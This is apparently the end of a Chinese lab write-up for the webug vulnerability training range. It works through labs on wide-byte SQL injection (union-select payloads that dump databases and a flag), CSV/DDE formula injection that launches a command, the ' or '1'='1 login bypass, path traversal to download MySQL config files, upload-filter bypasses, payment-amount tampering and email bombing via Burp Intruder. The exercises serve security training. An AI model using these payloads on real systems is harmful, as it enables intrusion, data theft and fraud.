同上，并没有过滤。
## **宽字节注入**
报错
id=1%df%27
如下
正常显示
id=1%df%27--+
如下
查看当前字段数，字段数为2
id=1%df%27 order by 2--+
如下
查看显示位
id=1%df%27 and 1=2 union select 1,2--+
我们可以在2处获得我们想要的内容
查看所有数据库
id=1%df%27%20and%201=2%20union%20select%201,concat(schema_name,0x7e)%20from%20information_schema.schemata--+
为information_schema~mysql~performance_schema~webug~webug_sys~webug_width_byte~
查看webug数据库下的所有表
id=1%df%27 and 1=2 union select 1,group_concat(table_name) from
information_schema.tables where table_schema=0x7765627567--+
为data_crud,env_list,env_path,flag,sqlinjection,user,user_test
查看env_list表下所有字段
id=1%df%27 and 1=2 union select 1,group_concat(column_name) from
information_schema.columns where table_name=0x656E765F6C697374--+
为id,envName,envDesc,envIntegration,delFlag,envFlag,level,type
查看flag
id=1%df%27 and 1=2 union select 1,envFlag from webug.env_list limit 5,1--+
为dfsadfsadfas
## **xxe注入**
整体浏览网站
因为是xxe注入，所以直接输入xml格式数据传输过去
          xxe
          xxe test
可以看到我们输入的内容会被显示出来，那么就代表xml代码能够被网站解析执行。
## **csv注入**
1、什么是csv注入？
CSV公式注入(CSV
Injection）是一种会造成巨大影响的攻击向量。攻击包含向恶意的EXCEL公式中注入可以输出或以CSV文件读取的参数。当在Excel中打开CSV文件时，文件会从CSV描述转变为原始的Excel格式，包括Excel提供的所有动态功能。在这个过程中，CSV中的所有Excel公式都会执行。当该函数有合法意图时，很易被滥用并允许恶意代码执行。
2.cvs注入的原理时是什么？
当输入一个公式，会被Excel自动运算并执行。而当你输入一个别的Excel本身不存在的功能时，Excel就会被微软的另一种机制：DDE机制调用。
3.什么是DDE？
DDE是一种动态数据交换机制（Dynamic Data
Exchange，DDE）。使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。客户机应用程序向当前所激活的服务器应用程序发送一条消息请求信息，服务器应用程序根据该信息作出应答，从而实现两个程序之间的数据交换。
构造payload：
=cmd|' /C calc'!A0
在单元格中输入
按下回车键，会出现恶意提示
点击是，会弹出计算器
## **反射型xss**
整体浏览网页
可以看到1是我们可控制点
pyaload:
`id=1`
成功弹窗
## **存储型xss**
整体浏览网页，可以看到最后有一个留言框
构造payload：
``
成功弹窗
## **万能密码登陆**
整体浏览网页
账号：admin
密码：' or '1'='1
## **DOM型xss**
打开靶场，可以看到输入框
构造payload：
`"required=" ">
成功弹窗
## **链接注入**
"链接注入"是修改站点内容的行为，其方式为将外部站点的 URL 嵌入其中，或将有易受攻击的站点中的脚本 的 URL 嵌入其中。将 URL
嵌入易受攻击的站点中，攻击者便能够以它为平台来启动对其他站点的攻击，以及攻击这个易受攻击的站点本身。
在这些可能的攻击中，有些需要用户在攻击期间登录站点。攻击者从这一易受攻击的站点本身启动这些攻击，成功的机会比较大，因为用户登录的可能性更大。
“链接注入”漏洞是用户输入清理不充分的结果，清理结果会在稍后的站点响应中返回给用户。攻击者能够将危险字符注入响应中，便能够嵌入 URL
及其他可能的内容修改。
整体浏览网页
构造payload：
    id=baidu
成功将百度嵌入到页面中
## **任意文件下载**
打开网页，看到下载按钮
鼠标右键，点击复制链接地址
构造payload：
file=template/assets/img/1.txt
file=index.php
可以下载index.php，看到php源码
## **mysql配置文件下载**
此题与上题原理相同，不过题目是需要我们下载mysql的配置文件
../mysql/时，执行了下载命令，说明存在mysql目录
file=../mysql/
直接下载my.ini
file=../mysql/my.ini
成功下载
## **文件上传(前端拦截)**
整体浏览网页，选择php类型的文件时会显示不允许上传
将phpinfo后缀名修改为png，burp抓包
将后缀名重新修改为php
点击上传，得到文件路径
成功访问
## **文件上传(畸形文件)**
将文件命名为：
phpinfo.png
burp抓包后将文件名改成.pphphp
phpinfo.pphphp
即可绕过
访问路径
/template/upload/1616405351.php
上传成功
## **支付漏洞**
进入靶场，点击立刻购买时，可以看到我们直接购买了商品
打开burp suite，点击立刻购买时，拦截数据包
可以看到金额为100，我们修改成0.01，然后发包，提示我们花了0.01购买了商品
## **邮箱轰炸**
输入邮箱，点击注册，然后利用burp suite进行抓包
PI:EMAIL
发送到intruder模块
设置payload：
选择Null payload
输入发送次数，20次
## **URL跳转**
整体浏览网页
复制链接地址
构造payload：
url=
url=
成功跳转
## **文件包含漏洞**
整体浏览网站，本身就已经证明了是包含漏洞
构造payload：
filename=../../control/upload_file/upload_file_3.php
成功跳转到文件上传页面
文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。
转载声明：儒道易行
拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。